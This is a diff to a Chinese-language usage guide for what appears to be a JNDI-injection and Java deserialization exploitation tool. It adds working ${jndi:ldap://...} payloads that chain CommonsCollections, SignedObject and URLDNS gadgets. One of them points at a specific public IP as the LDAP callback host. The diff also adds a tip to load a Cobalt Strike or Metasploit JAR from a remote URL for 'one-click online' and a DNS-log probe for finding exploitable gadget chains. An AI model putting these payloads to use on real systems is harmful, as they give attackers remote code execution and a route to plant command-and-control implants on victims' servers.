@@ -117,6 +117,7 @@ TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序�
 RC ：Remote Call - 通过 URLClassLoader.loadClass()
 来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass
 
+换成CS或者MSF生成的JAR包，即可完成一键上线。
 ```
 {{url
     (${jndi:ldap://0.0.0.0:1389/Deserialization/Clojure/nu1r/Base64/{{base64
@@ -186,11 +187,14 @@ WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命�
 
 * 利用方式：
 * SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:10000' 20000
+* 类名全小写，否则报错为null
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/Deserialization/SignedObject/nu1r/Base64/{{base64
-        (CC:CommonsCollections6:arg2:10000#open -a Calculator.app)
+    (${jndi:ldap://42.192.234.204:1389/Deserialization/SignedObject/nu1r/Base64/{{base64
+        (CC:commonscollections6:{{base64
+            (open -a Calculator.app)
+        }}:10000)
     }}})
 }}
 ```
@@ -372,6 +376,18 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 {{url
     (${jndi:ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/{{base64
         (whoami)
+    }}})
+}}
+```
+
+# 利用链探测
+
+示例：all:xxxxxx.dns.log
+
+```
+{{url
+    (${jndi:ldap://0.0.0.0:1389/Deserialization/URLDNS/nu1r/Base64/{{base64
+        (all:xxxxxx.dns.log)
     }}})
 }}
 ```
